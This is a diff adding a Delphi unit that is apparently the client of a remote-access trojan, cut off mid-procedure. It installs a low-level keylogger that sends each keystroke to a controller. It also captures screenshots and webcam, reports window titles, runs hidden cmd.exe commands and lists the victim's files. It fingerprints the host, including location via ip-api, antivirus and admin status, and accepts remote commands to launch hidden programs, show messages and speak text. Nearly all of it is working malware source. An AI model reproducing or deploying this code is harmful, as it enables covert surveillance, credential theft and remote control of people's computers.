@@ -1,0 +1,1569 @@
+unit Unit1;
+
+interface
+
+uses
+  Windows, Winapi.Messages, System.SysUtils, System.Variants,
+  System.Classes, Vcl.Graphics,
+  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.ExtCtrls, ncSources, ncSockets,
+  IdHTTP, System.JSON, ActiveX, System.Win.ComObj, Unit2, ShellAPI,
+  System.IOUtils, System.NetEncoding, Vcl.Imaging.pngimage, Vcl.Imaging.jpeg,
+  VFrames, Clipbrd, Winapi.TlHelp32, PsAPI, Vcl.StdCtrls, ZLib;
+
+const
+  EVENT_SYSTEM_FOREGROUND = $0003; // Event for window gaining focus
+  WINEVENT_OUTOFCONTEXT = 0; // Event for window gaining focus
+
+type
+  HWINEVENTHOOK = THandle;
+
+var
+  HookHandle: HHOOK;
+  WinEventHook: HWINEVENTHOOK;
+
+type
+  PKBDLLHOOKSTRUCT = ^KBDLLHOOKSTRUCT;
+
+  KBDLLHOOKSTRUCT = packed record
+    vkCode: DWORD;
+    scanCode: DWORD;
+    flags: DWORD;
+    time: DWORD;
+    dwExtraInfo: ULONG_PTR;
+  end;
+
+var
+  KeyboardHook: HHOOK;
+
+type
+  TForm1 = class(TForm)
+    ClientSource: TncClientSource;
+    ScreenCaptureTimer: TTimer;
+    WebcamTimer: TTimer;
+    Memo1: TMemo;
+    procedure ClientSourceConnected(Sender: TObject; aLine: TncLine);
+    procedure FormCreate(Sender: TObject);
+    function ClientSourceHandleCommand(Sender: TObject; aLine: TncLine;
+      aCmd: Integer; const aData: TBytes; aRequiresResult: Boolean;
+      const aSenderComponent, aReceiverComponent: string): TBytes;
+    procedure ScreenCaptureTimerTimer(Sender: TObject);
+    procedure WebcamTimerTimer(Sender: TObject);
+    procedure FormDestroy(Sender: TObject);
+  private
+    { Private declarations }
+    OldBitmap: TBitmap;
+    FCurrentDir: string;
+    function ExecuteCommand(const Cmd: string): string;
+  public
+    { Public declarations }
+    VictimCamCanvas: TImage;
+    cam: TVideoImage;
+    strlst: TStringList;
+  end;
+
+var
+  Form1: TForm1;
+
+implementation
+
+{$R *.dfm}
+
+function TForm1.ExecuteCommand(const Cmd: string): string;
+var
+  SecurityAttr: TSecurityAttributes;
+  ReadPipe, WritePipe: THandle;
+  StartInfo: TStartUpInfo;
+  ProcessInfo: TProcessInformation;
+  Buffer: array [0 .. 1023] of AnsiChar;
+  BytesRead: DWORD;
+  Output: TStringStream;
+  FullCmd: string;
+begin
+  Result := '';
+  SecurityAttr.nLength := SizeOf(TSecurityAttributes);
+  SecurityAttr.bInheritHandle := True;
+  SecurityAttr.lpSecurityDescriptor := nil;
+
+  if not CreatePipe(ReadPipe, WritePipe, @SecurityAttr, 0) then
+    RaiseLastOSError;
+  try
+    ZeroMemory(@StartInfo, SizeOf(TStartUpInfo));
+    StartInfo.cb := SizeOf(TStartUpInfo);
+    StartInfo.hStdOutput := WritePipe;
+    StartInfo.hStdError := WritePipe;
+    StartInfo.hStdInput := GetStdHandle(STD_INPUT_HANDLE);
+    StartInfo.dwFlags := STARTF_USESTDHANDLES or STARTF_USESHOWWINDOW;
+    StartInfo.wShowWindow := SW_HIDE;
+
+    FullCmd := 'cmd.exe /C ' + Cmd;
+    if not CreateProcess(nil, PChar(FullCmd), nil, nil, True, CREATE_NO_WINDOW,
+      nil, PChar(FCurrentDir), StartInfo, ProcessInfo) then
+      RaiseLastOSError;
+
+    CloseHandle(WritePipe);
+    Output := TStringStream.Create('');
+    try
+      repeat
+        BytesRead := 0;
+        if ReadFile(ReadPipe, Buffer, SizeOf(Buffer) - 1, BytesRead, nil) then
+        begin
+          Buffer[BytesRead] := #0;
+          Output.WriteString(Buffer);
+        end;
+      until BytesRead = 0;
+      WaitForSingleObject(ProcessInfo.hProcess, INFINITE);
+      Result := Output.DataString;
+    finally
+      Output.Free;
+    end;
+
+    CloseHandle(ProcessInfo.hProcess);
+    CloseHandle(ProcessInfo.hThread);
+  finally
+    CloseHandle(ReadPipe);
+  end;
+end;
+
+type
+  TRGBTriple = packed record
+    rgbtBlue: Byte;
+    rgbtGreen: Byte;
+    rgbtRed: Byte;
+  end;
+
+  PRGBTripleArray = ^TRGBTripleArray;
+  TRGBTripleArray = array [0 .. MaxInt div SizeOf(TRGBTriple) - 1]
+    of TRGBTriple;
+
+procedure UpdateChangedPixels(OldBitmap, NewBitmap: TBitmap;
+  MonitorIndex: Integer);
+var
+  x, y: Integer;
+  OldRow, NewRow: PRGBTripleArray;
+  Monitor: TMonitor;
+  MonitorRect: TRect;
+begin
+  Monitor := Screen.Monitors[MonitorIndex];
+  MonitorRect := Monitor.BoundsRect;
+
+  // Ensure both bitmaps have the same dimensions
+  if (OldBitmap.Width <> NewBitmap.Width) or
+    (OldBitmap.Height <> NewBitmap.Height) then
+  begin
+    OldBitmap.Assign(NewBitmap); // Reset OldBitmap if dimensions don't match
+    Exit;
+  end;
+
+  // Compare and update only changed pixels using ScanLine
+  for y := 0 to NewBitmap.Height - 1 do
+  begin
+    OldRow := OldBitmap.ScanLine[y];
+    NewRow := NewBitmap.ScanLine[y];
+    for x := 0 to NewBitmap.Width - 1 do
+    begin
+      // If pixel has changed, update OldBitmap
+      if (OldRow[x].rgbtRed <> NewRow[x].rgbtRed) or
+        (OldRow[x].rgbtGreen <> NewRow[x].rgbtGreen) or
+        (OldRow[x].rgbtBlue <> NewRow[x].rgbtBlue) then
+      begin
+        OldRow[x] := NewRow[x];
+      end;
+    end;
+  end;
+end;
+
+function GetMonitorScreenshot(MonitorIndex: Integer): TBitmap;
+var
+  DesktopDC: HDC;
+  Monitor: TMonitor;
+  MonitorWidth, MonitorHeight: Integer;
+  MonitorRect: TRect;
+begin
+  Result := TBitmap.Create;
+  try
+    // Get the monitor based on the index provided
+    Monitor := Screen.Monitors[MonitorIndex];
+    MonitorRect := Monitor.BoundsRect;
+
+    // Set the bitmap dimensions according to the monitor size
+    MonitorWidth := MonitorRect.Right - MonitorRect.Left;
+    MonitorHeight := MonitorRect.Bottom - MonitorRect.Top;
+
+    Result.Width := MonitorWidth;
+    Result.Height := MonitorHeight;
+    Result.PixelFormat := pf24bit; // Set the pixel format to 24-bit
+
+    // Get the desktop device context
+    DesktopDC := GetDC(0);
+    try
+      // Capture the screen area for the specific monitor
+      BitBlt(Result.Canvas.Handle, 0, 0, MonitorWidth, MonitorHeight, DesktopDC,
+        MonitorRect.Left, MonitorRect.Top, SRCCOPY);
+    finally
+      // Release the device context
+      ReleaseDC(0, DesktopDC);
+    end;
+
+  except
+    Result.Free;
+    raise;
+  end;
+end;
+
+procedure CaptureAndUpdateChangedPixels(var OldBitmap: TBitmap;
+  MonitorIndex: Integer);
+var
+  NewBitmap: TBitmap;
+begin
+  NewBitmap := GetMonitorScreenshot(MonitorIndex); // Capture new screenshot
+  try
+    // If OldBitmap is not assigned (first time), initialize it
+    if OldBitmap = nil then
+    begin
+      OldBitmap := TBitmap.Create;
+      OldBitmap.Assign(NewBitmap); // Set OldBitmap to the full new screenshot
+    end
+    else
+    begin
+      // Update only changed pixels in OldBitmap
+      UpdateChangedPixels(OldBitmap, NewBitmap, MonitorIndex);
+    end;
+  finally
+    NewBitmap.Free;
+  end;
+end;
+
+procedure WinEventProc(HWINEVENTHOOK: HWINEVENTHOOK; event: DWORD; HWND: HWND;
+  idObject, idChild: LONG; dwEventThread, dwmsEventTime: DWORD); stdcall;
+var
+  Buffer: array [0 .. 255] of Char;
+begin
+  if event = EVENT_SYSTEM_FOREGROUND then
+  begin
+    // Retrieve the title of the focused window
+    if GetWindowText(HWND, Buffer, SizeOf(Buffer)) > 0 then
+    begin
+      Form1.ClientSource.ExecCommand(0, BytesOf('FocWindow|' + Buffer), False);
+
+    end;
+  end;
+end;
+
+procedure InstallWinEventHook;
+begin
+  if WinEventHook = 0 then
+  begin
+    WinEventHook := SetWinEventHook(EVENT_SYSTEM_FOREGROUND,
+      EVENT_SYSTEM_FOREGROUND, 0, @WinEventProc, 0, 0, WINEVENT_OUTOFCONTEXT);
+  end;
+end;
+
+procedure UninstallWinEventHook;
+begin
+  if WinEventHook <> 0 then
+  begin
+    UnhookWinEvent(WinEventHook);
+    WinEventHook := 0;
+  end;
+end;
+
+function VKToChar(vkCode: DWORD): string;
+var
+  keyboardState: TKeyboardState;
+  Buffer: array [0 .. 1] of Char;
+begin
+  GetKeyboardState(keyboardState);
+
+  // Convert vkCode to character using current keyboard layout
+  if ToUnicode(vkCode, MapVirtualKey(vkCode, 0), keyboardState, @Buffer, 1, 0) > 0
+  then
+    Result := Buffer[0]
+  else
+    Result := '';
+end;
+
+// Low-level keyboard hook procedure
+function LowLevelKeyboardProc(nCode: Integer; wParam: wParam; lParam: lParam)
+  : LRESULT; stdcall;
+var
+  kbStruct: KBDLLHOOKSTRUCT;
+  keyChar: string;
+  shiftPressed: Boolean;
+begin
+  if (nCode = HC_ACTION) and (wParam = WM_KEYDOWN) then
+  begin
+    kbStruct := PKBDLLHOOKSTRUCT(lParam)^;
+
+    // Check if Shift key is pressed
+    shiftPressed := (GetKeyState(VK_SHIFT) and $8000) <> 0;
+
+    // Handle specific non-printable keys with custom labels
+    case kbStruct.vkCode of
+      VK_BACK:
+        keyChar := '[Backspace]';
+      VK_RETURN:
+        keyChar := '[Enter]'#13#10;
+      VK_TAB:
+        keyChar := '[Tab]';
+      VK_SPACE:
+        keyChar := ' ';
+      VK_ESCAPE:
+        keyChar := '[Escape]';
+      VK_LWIN, VK_RWIN:
+        keyChar := '[Win]';
+      VK_SNAPSHOT:
+        keyChar := '[Snapshot]';
+      VK_SHIFT, VK_LSHIFT, VK_RSHIFT:
+        keyChar := '[Shift]';
+      VK_CONTROL, VK_LCONTROL, VK_RCONTROL:
+        keyChar := '[Ctrl]';
+      VK_MENU, VK_LMENU, VK_RMENU:
+        keyChar := '[Alt]';
+      VK_CAPITAL:
+        keyChar := '[Caps Lock]';
+      VK_NUMLOCK:
+        keyChar := '[Num Lock]';
+      VK_SCROLL:
+        keyChar := '[Scroll Lock]';
+      VK_INSERT:
+        keyChar := '[Insert]';
+      VK_DELETE:
+        keyChar := '[Delete]';
+      VK_HOME:
+        keyChar := '[Home]';
+      VK_END:
+        keyChar := '[End]';
+      VK_PRIOR:
+        keyChar := '[Page Up]';
+      VK_NEXT:
+        keyChar := '[Page Down]';
+      VK_LEFT:
+        keyChar := '[Left Arrow]';
+      VK_RIGHT:
+        keyChar := '[Right Arrow]';
+      VK_UP:
+        keyChar := '[Up Arrow]';
+      VK_DOWN:
+        keyChar := '[Down Arrow]';
+      VK_F1 .. VK_F12:
+        keyChar := '[F' + IntToStr(kbStruct.vkCode - VK_F1 + 1) + ']';
+        // F1 to F12 keys
+    else
+      // For printable keys, translate vkCode to character
+      keyChar := VKToChar(kbStruct.vkCode);
+    end;
+
+    // Append the character or key name to Memo1 if it's not empty
+    if keyChar <> '' then
+
+      Form1.ClientSource.ExecCommand(0, BytesOf('Keylog|' + keyChar), False);
+  end;
+
+  Result := CallNextHookEx(KeyboardHook, nCode, wParam, lParam);
+end;
+
+procedure InstallKeyboardHook;
+begin
+  if KeyboardHook = 0 then
+  begin
+    KeyboardHook := SetWindowsHookEx(WH_KEYBOARD_LL,
+      @LowLevelKeyboardProc, 0, 0);
+  end;
+end;
+
+procedure UninstallKeyboardHook;
+begin
+  if KeyboardHook <> 0 then
+  begin
+    UnhookWindowsHookEx(KeyboardHook);
+    KeyboardHook := 0;
+  end;
+end;
+
+procedure SENDVICTIMDIRECTORY(strPath: string);
+var
+  Icon: TIcon;
+  SearchRec: TSearchRec;
+  FileInfo: SHFILEINFO;
+  FileName: string;
+  FileType: string;
+  FileSize: string;
+  FileModifiedDate: string;
+  MS: TMemoryStream;
+  SS: TStringStream;
+  FullPath: string;
+begin
+  // Create a temporary TIcon
+  Icon := TIcon.Create;
+  try
+    // Ensure strPath ends with a backslash
+    if not strPath.EndsWith('\') then
+      strPath := strPath + '\';
+
+    // search for the first file or folder
+    if FindFirst(strPath + '*.*', faAnyFile, SearchRec) = 0 then
+    begin
+      repeat
+        FullPath := strPath + SearchRec.Name;
+
+        // Get The DisplayName
+        SHGetFileInfo(PChar(FullPath), 0, FileInfo, SizeOf(FileInfo), SHGFI_DISPLAYNAME);
+        FileName := FileInfo.szDisplayName;
+
+        // Get The TypeName
+        SHGetFileInfo(PChar(FullPath), 0, FileInfo, SizeOf(FileInfo), SHGFI_TYPENAME);
+        FileType := FileInfo.szTypeName;
+
+        // Get The Icon That Represents The File or Folder
+        SHGetFileInfo(PChar(FullPath), 0, FileInfo, SizeOf(FileInfo), SHGFI_ICON or SHGFI_SMALLICON);
+        Icon.Handle := FileInfo.hIcon;
+
+        // Check if the icon handle is valid
+        if Icon.Handle <> 0 then
+        begin
+          try
+            // Save the ICON to a MemoryStream and stream it over the socket
+            MS := TMemoryStream.Create;
+            try
+              Icon.SaveToStream(MS);
+              MS.Position := 0;
+
+              // Compress the icon stream
+              SS := TStringStream.Create;
+              try
+                ZCompressStream(MS, SS);
+                 Form1.ClientSource.ExecCommand(0, BytesOf('I|'  + SS.DataString), False);
+              finally
+                SS.Free;
+              end;
+            finally
+              MS.Free;
+            end;
+          finally
+            DestroyIcon(Icon.Handle); // Release the icon handle
+          end;
+
+          // Get file size
+          if (SearchRec.Attr and faDirectory) = faDirectory then
+            FileSize := 'Folder'
+          else
+            FileSize := IntToStr(SearchRec.Size);
+
+          // Get last modified date
+          FileModifiedDate := DateTimeToStr(FileDateToDateTime(SearchRec.Time));
+
+          // Send file/folder details over the socket
+            Form1.ClientSource.ExecCommand(0, BytesOf('AddFileORFolder|'  + FileName + '|' + FileType + '|' + FileSize + '|' + FileModifiedDate), False);
+        end;
+
+      until FindNext(SearchRec) <> 0;
+    end;
+  finally
+    FindClose(SearchRec); // Close the search handle
+    Icon.Free;
+  end;
+end;
+
+function GetCountryByIP: string;
+var
+  HTTP: TIdHTTP;
+  Response: string;
+  JSONObj: TJSONObject;
+begin
+  Result := 'Unknown'; // Default value if unable to determine country
+  HTTP := TIdHTTP.Create(nil);
+  try
+    try
+      Response := HTTP.Get('http://ip-api.com/json/');
+
+      // Parse the JSON response
+      JSONObj := TJSONObject.ParseJSONValue(Response) as TJSONObject;
+      if Assigned(JSONObj) then
+        try
+          Result := JSONObj.GetValue('country').Value;
+        finally
+          JSONObj.Free;
+        end;
+    except
+      on E: Exception do
+        Result := 'Unknown';
+    end;
+  finally
+    HTTP.Free;
+  end;
+end;
+
+procedure GetLatLonByIP(out Lat, Lon: string);
+var
+  HTTP: TIdHTTP;
+  Response: string;
+  JSONObj: TJSONObject;
+begin
+  Lat := 'Unknown';
+  Lon := 'Unknown';
+  HTTP := TIdHTTP.Create(nil);
+  try
+    try
+      // Make the request to ip-api.com
+      Response := HTTP.Get('http://ip-api.com/json/');
+
+      // Parse the JSON response
+      JSONObj := TJSONObject.ParseJSONValue(Response) as TJSONObject;
+      if Assigned(JSONObj) then
+        try
+          // Extract the "lat" and "lon" fields from the JSON
+          Lat := JSONObj.GetValue('lat').ToString;
+          Lon := JSONObj.GetValue('lon').ToString;
+        finally
+          JSONObj.Free;
+        end;
+    except
+      on E: Exception do
+      begin
+        Lat := 'Unknown';
+        Lon := 'Unknown';
+      end;
+    end;
+  finally
+    HTTP.Free;
+  end;
+end;
+
+function GetOSName: string;
+var
+  BracketPos: Integer;
+begin
+  Result := TOSVersion.ToString;
+  BracketPos := Pos('(', Result);
+  if BracketPos > 0 then
+    Result := Trim(Copy(Result, 1, BracketPos - 1));
+end;
+
+function GetUserAndPCName: String;
+var
+  UserBuffer, PCBuffer: array [0 .. 255] of Char;
+  UserSize, PCSize: DWORD;
+begin
+  UserSize := 256;
+  PCSize := 256;
+
+  if GetComputerName(PCBuffer, PCSize) and GetUserName(UserBuffer, UserSize)
+  then
+    Result := Format('%s/%s', [UserBuffer, PCBuffer])
+  else
+end;
+
+function IsAppRunningAsAdmin: String;
+var
+  hToken: THandle;
+  pElevation: TOKEN_ELEVATION;
+  dwSize: DWORD;
+begin
+  Result := 'False'; // Default result
+
+  // Open the access token associated with the current process
+  if OpenProcessToken(GetCurrentProcess, TOKEN_QUERY, hToken) then
+  begin
+    try
+      // Query the elevation token information
+      if GetTokenInformation(hToken, TokenElevation, @pElevation,
+        SizeOf(pElevation), dwSize) then
+      begin
+        // Check if the token is elevated (1 = elevated, meaning admin permissions)
+        if pElevation.TokenIsElevated = 1 then
+          Result := 'True'
+        else
+          Result := 'False';
+      end;
+    finally
+      // Close the token handle
+      CloseHandle(hToken);
+    end;
+  end;
+end;
+
+function GetInstalledAntivirus: String;
+var
+  FWMIService: OLEVariant;
+  FWbemLocator: OLEVariant;
+  FWbemObjectSet: OLEVariant;
+  FWbemObject: OLEVariant;
+  oEnum: IEnumvariant;
+  iValue: LongWord;
+  AntivirusName: string;
+begin
+  Result := 'Unknown';
+  try
+    CoInitialize(nil);
+    try
+      FWbemLocator := CreateOleObject('WbemScripting.SWbemLocator');
+      FWMIService := FWbemLocator.ConnectServer('localhost',
+        'root\SecurityCenter2', '', '', '', '', 0);
+      FWbemObjectSet := FWMIService.ExecQuery('SELECT * FROM AntiVirusProduct',
+        'WQL', 0);
+
+      oEnum := IUnknown(FWbemObjectSet._NewEnum) as IEnumvariant;
+      if oEnum.Next(1, FWbemObject, iValue) = 0 then
+      begin
+        AntivirusName := FWbemObject.DisplayName;
+        Result := AntivirusName;
+        FWbemObject := Unassigned;
+      end;
+    finally
+      CoUninitialize;
+    end;
+  except
+    on E: Exception do
+    begin
+      Result := 'Error: ' + E.Message;
+    end;
+  end;
+end;
+
+function IsWebcamPresent: Boolean;
+var
+  WMIService: OLEVariant;
+  DeviceQuery: OLEVariant;
+begin
+  Result := False;
+  try
+    CoInitialize(nil);
+    try
+      WMIService := CreateOleObject('WbemScripting.SWbemLocator');
+      WMIService := WMIService.ConnectServer('localhost', 'root\cimv2', '', '',
+        '', '', 0);
+
+      DeviceQuery := WMIService.ExecQuery
+        ('SELECT * FROM Win32_PnPEntity WHERE Caption LIKE "%Webcam%"',
+        'WQL', 0);
+
+      if not VarIsNull(DeviceQuery) and (DeviceQuery.Count > 0) then
+        Result := True;
+    finally
+      CoUninitialize;
+    end;
+  except
+    on E: Exception do
+      Result := False;
+  end;
+end;
+
+function IsWebcamPresentStr: string;
+begin
+  if IsWebcamPresent then
+    Result := 'True'
+  else
+    Result := 'False';
+end;
+
+function GetHardwareID: string;
+var
+  MachineGuid: TGUID;
+begin
+  CreateGUID(MachineGuid);
+  Result := GuidToString(MachineGuid);
+end;
+
+function GetScreenShot(MonitorIndex: Integer): TBitmap;
+var
+  DesktopDC: HDC;
+  Monitor: TMonitor;
+  ScreenWidth, ScreenHeight: Integer;
+begin
+  Result := TBitmap.Create;
+  try
+    Monitor := Screen.Monitors[MonitorIndex];
+    ScreenWidth := GetSystemMetrics(SM_CXSCREEN);
+    ScreenHeight := GetSystemMetrics(SM_CYSCREEN);
+
+    Result.Width := ScreenWidth;
+    Result.Height := ScreenHeight;
+    Result.PixelFormat := pf24bit;
+    DesktopDC := GetDC(0);
+    try
+      BitBlt(Result.Canvas.Handle, 0, 0, ScreenWidth, ScreenHeight, DesktopDC,
+        0, 0, SRCCOPY);
+    finally
+      ReleaseDC(0, DesktopDC);
+    end;
+
+  except
+    Result.Free;
+    raise;
+  end;
+end;
+
+function GetSystemUptime: string;
+var
+  UptimeMilliseconds: UInt64;
+  UptimeSeconds, UptimeMinutes, UptimeHours: UInt64;
+begin
+  // Get the system uptime in milliseconds
+  UptimeMilliseconds := GetTickCount64;
+
+  // Convert milliseconds to seconds
+  UptimeSeconds := UptimeMilliseconds div 1000;
+
+  // Calculate hours and minutes
+  UptimeHours := UptimeSeconds div 3600;
+  UptimeSeconds := UptimeSeconds mod 3600;
+  UptimeMinutes := UptimeSeconds div 60;
+
+  // Return uptime as a string in the format: "29 hours, 42 minutes"
+  Result := Format('%d hours %d minutes', [UptimeHours, UptimeMinutes]);
+end;
+
+function GetCPUName: string;
+var
+  WMIService: OLEVariant;
+  CPUQuery: OLEVariant;
+begin
+  Result := 'Unknown';
+  try
+    CoInitialize(nil);
+    try
+      WMIService := CreateOleObject('WbemScripting.SWbemLocator');
+      WMIService := WMIService.ConnectServer('localhost', 'root\cimv2', '', '',
+        '', '', 0);
+
+      CPUQuery := WMIService.ExecQuery('SELECT * FROM Win32_Processor',
+        'WQL', 0);
+
+      if not VarIsNull(CPUQuery) and (CPUQuery.Count > 0) then
+        Result := CPUQuery.ItemIndex(0).Name;
+    finally
+      CoUninitialize;
+    end;
+  except
+    on E: Exception do
+      Result := 'Error: ' + E.Message;
+  end;
+end;
+
+function GetMemoryUsage: string;
+var
+  MemoryStatus: TMemoryStatusEx;
+  TotalMemoryGB, UsedMemoryGB, AvailableMemoryGB: Double;
+  MemoryUsagePercent: Integer;
+begin
+  MemoryStatus.dwLength := SizeOf(TMemoryStatusEx);
+
+  if GlobalMemoryStatusEx(MemoryStatus) then
+  begin
+    TotalMemoryGB := MemoryStatus.ullTotalPhys / (1024 * 1024 * 1024);
+    // Convert bytes to GB
+    AvailableMemoryGB := MemoryStatus.ullAvailPhys / (1024 * 1024 * 1024);
+    // Convert bytes to GB
+    UsedMemoryGB := TotalMemoryGB - AvailableMemoryGB;
+    // Used memory in GB
+
+    MemoryUsagePercent := Round((UsedMemoryGB / TotalMemoryGB) * 100);
+
+    // Return memory usage as a string in the format: 65% 10.3/15.9 GB
+    Result := Format('%d%% %.1f/%.1f GB', [MemoryUsagePercent, UsedMemoryGB,
+      TotalMemoryGB]);
+  end
+  else
+    Result := 'Unknown';
+end;
+
+function GetIdleTime: string;
+var
+  LastInputInfo: TLastInputInfo;
+  LastInputTickCount: Cardinal;
+  IdleTime: Cardinal;
+begin
+  LastInputInfo.cbSize := SizeOf(TLastInputInfo);
+
+  // Get last input info
+  if GetLastInputInfo(LastInputInfo) then
+  begin
+    LastInputTickCount := LastInputInfo.dwTime;
+
+    // Calculate idle time in milliseconds
+    IdleTime := GetTickCount - LastInputTickCount;
+
+    // Convert idle time to seconds
+    IdleTime := IdleTime div 1000;
+
+    // Convert idle time to hours and minutes
+    Result := Format('%d minutes %d seconds',
+      [IdleTime div 60, IdleTime mod 60]);
+  end
+  else
+    Result := 'Unknown';
+end;
+
+function GetGPUName: string;
+var
+  WMIService: OLEVariant;
+  GPUQuery: OLEVariant;
+begin
+  Result := 'Unknown';
+  try
+    CoInitialize(nil);
+    try
+      WMIService := CreateOleObject('WbemScripting.SWbemLocator');
+      WMIService := WMIService.ConnectServer('localhost', 'root\cimv2', '', '',
+        '', '', 0);
+
+      GPUQuery := WMIService.ExecQuery('SELECT * FROM Win32_VideoController',
+        'WQL', 0);
+
+      if not VarIsNull(GPUQuery) and (GPUQuery.Count > 0) then
+        Result := GPUQuery.ItemIndex(0).Name;
+    finally
+      CoUninitialize;
+    end;
+  except
+    on E: Exception do
+      Result := 'Error: ' + E.Message;
+  end;
+end;
+
+procedure TForm1.ClientSourceConnected(Sender: TObject; aLine: TncLine);
+var
+  Lat, Lon: string;
+begin
+  self.ClientSource.ExecCommand(0, BytesOf('NewCon|' + GetCountryByIP + '|' +
+    GetUserAndPCName + '|Online|Active Window|Delta|' + GetOSName + '|' +
+    IsAppRunningAsAdmin + '|1.0.0|' + GetInstalledAntivirus + '|' +
+    IsWebcamPresentStr + '|' + GetHardwareID), False);
+
+  GetLatLonByIP(Lat, Lon);
+  self.ClientSource.ExecCommand(0,
+    BytesOf('Location|' + Lat + '|' + Lon), False);
+end;
+
+function TForm1.ClientSourceHandleCommand(Sender: TObject; aLine: TncLine;
+  aCmd: Integer; const aData: TBytes; aRequiresResult: Boolean;
+  const aSenderComponent, aReceiverComponent: string): TBytes;
+
+var
+  SL: TStringList;
+  CmdOutput: string;
+  i: Integer;
+  ImageData: TBytes;
+  FileData: TBytes;
+  FileName: string;
+  FileStream: TFileStream;
+  Writer: TStreamWriter;
+  BMP: TBitmap;
+  bytestream: TBytesStream;
+  ClipHandle: THandle;
+  ClipFormat: Cardinal;
+begin
+  SL := TStringList.Create;
+  SL.Delimiter := '|';
+  SL.StrictDelimiter := True;
+  SL.DelimitedText := stringof(aData);
+
+  if SL[0] = 'GeneralInfo' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      var
+        BMP: TBitmap;
+        bytestream: TBytesStream;
+      begin
+        self.ClientSource.ExecCommand(0,
+          BytesOf('ComputerInfo|' + GetUserAndPCName + '|' + GetOSName + '|' +
+          GetMemoryUsage + '|' + GetCPUName + '|' + GetGPUName + '|' +
+          GetSystemUptime + '|' + GetIdleTime), False);
+
+        BMP := GetScreenShot(0);
+        if Assigned(BMP) then
+        begin
+          try
+            bytestream := TBytesStream.Create;
+            try
+              BMP.SaveToStream(bytestream);
+              self.ClientSource.ExecCommand(0, BytesOf('IncomingScreenshot|') +
+                bytestream.Bytes, False);
+
+            finally
+              bytestream.Free;
+            end;
+          finally
+            BMP.Free;
+          end;
+        end;
+      end);
+    Exit;
+  end;
+
+  if SL[0] = 'SSHell' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      var
+        BMP: TBitmap;
+        bytestream: TBytesStream;
+      begin
+        BMP := GetScreenShot(0);
+        if Assigned(BMP) then
+        begin
+          try
+            bytestream := TBytesStream.Create;
+            try
+              BMP.SaveToStream(bytestream);
+              self.ClientSource.ExecCommand(0, BytesOf('IncomingSSShell|') +
+                bytestream.Bytes, False);
+            finally
+              bytestream.Free;
+            end;
+          finally
+            BMP.Free;
+          end;
+        end;
+      end);
+    Exit;
+  end;
+
+  if SL[0] = 'Chat' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      begin
+        Form2.Show;
+
+        if SL[5] = 'True' then
+        begin
+          Form2.BorderStyle := bsSizeable;
+        end
+        else
+        begin
+          Form2.BorderIcons := [];
+        end;
+
+        if SL[4] = 'True' then
+        begin
+          Form2.FormStyle := fsStayOnTop;
+        end
+        else
+        begin
+          Form2.FormStyle := fsNormal;
+        end;
+
+        if SL[3] = 'True' then
+        begin
+          Form2.Edit1.Enabled := False;
+        end
+        else
+        begin
+          Form2.Edit1.Enabled := True;
+        end;
+
+        Form2.Memo1.Clear;
+        Form2.Edit1.SetFocus;
+        Form2.Caption := SL[1];
+        Form2.Memo1.Lines.Add(SL[2]);
+      end);
+    Exit;
+  end;
+
+  if SL[0] = 'ChatMsg' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      begin
+        Form2.Memo1.Lines.Add(SL[1] + ' Said: ' + SL[2]);
+      end);
+    Exit;
+  end;
+
+  if SL[0] = 'CloseChat' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      begin
+        Form2.Close;
+      end);
+    Exit;
+  end;
+
+  if SL[0] = 'SendTTS' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      var
+        Voice: Variant;
+      begin
+        Voice := CreateOleObject('SAPI.SpVoice');
+        Voice.speak(SL[1]);
+      end);
+    Exit;
+  end;
+
+  if SL[0] = 'SendNote' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      var
+        NotepadFile: TextFile;
+        FileName: string;
+      begin
+        FileName := TPath.Combine(TPath.GetTempPath, TPath.GetRandomFileName
+          + '.txt');
+        AssignFile(NotepadFile, FileName);
+        Rewrite(NotepadFile);
+        try
+          WriteLn(NotepadFile, SL[1]);
+        finally
+          CloseFile(NotepadFile);
+        end;
+        ShellExecute(0, 'open', 'notepad.exe', PChar(FileName), nil,
+          SW_SHOWNORMAL);
+      end);
+    Exit;
+  end;
+
+  if SL[0] = 'HiddenWeb' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      var
+        SEInfo: TShellExecuteInfo;
+      begin
+        FillChar(SEInfo, SizeOf(SEInfo), 0);
+        SEInfo.cbSize := SizeOf(TShellExecuteInfo);
+        SEInfo.fMask := SEE_MASK_NOCLOSEPROCESS or SEE_MASK_FLAG_NO_UI;
+        SEInfo.Wnd := 0;
+        SEInfo.lpFile := PChar(SL[1]);
+        SEInfo.lpParameters := nil;
+        SEInfo.nShow := SW_HIDE;
+        if ShellExecuteEx(@SEInfo) then
+        begin
+          WaitForSingleObject(SEInfo.hProcess, INFINITE);
+          CloseHandle(SEInfo.hProcess); // Clean up
+        end
+        else
+        begin
+          ShowMessage('Failed to open application.');
+        end;
+      end);
+    Exit;
+  end;
+
+  if SL[0] = 'ShowWeb' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      var
+        URL: string;
+      begin
+        URL := SL[1];
+        URL := StringReplace(URL, '"', '%22', [rfReplaceAll]);
+        ShellExecute(0, 'open', PChar(URL), nil, nil, SW_SHOWNORMAL);
+      end);
+    Exit;
+  end;
+
+  if SL[0] = 'MSGBOX' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      var
+        IconType: Integer;
+        ButtonType: Integer;
+      begin
+        if SL[3] = 'INFO' then
+          IconType := MB_ICONINFORMATION
+        else if SL[3] = 'WARNING' then
+          IconType := MB_ICONWARNING
+        else if SL[3] = 'ERROR' then
+          IconType := MB_ICONERROR
+        else if SL[3] = 'QUESTION' then
+          IconType := MB_ICONQUESTION
+        else
+          IconType := 0; // No icon
+        if SL[4] = 'OK' then
+          ButtonType := MB_OK
+        else if SL[4] = 'YESNO' then
+          ButtonType := MB_YESNO
+        else if SL[4] = 'OKCANCEL' then
+          ButtonType := MB_OKCANCEL
+        else if SL[4] = 'ABORTRETRYIGNORE' then
+          ButtonType := MB_ABORTRETRYIGNORE
+        else
+          ButtonType := MB_OK;
+        Application.MessageBox(PChar(SL[2]), PChar(SL[1]),
+          ButtonType or IconType);
+      end);
+    Exit;
+  end;
+
+  if SL[0] = 'DiskExe' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      var
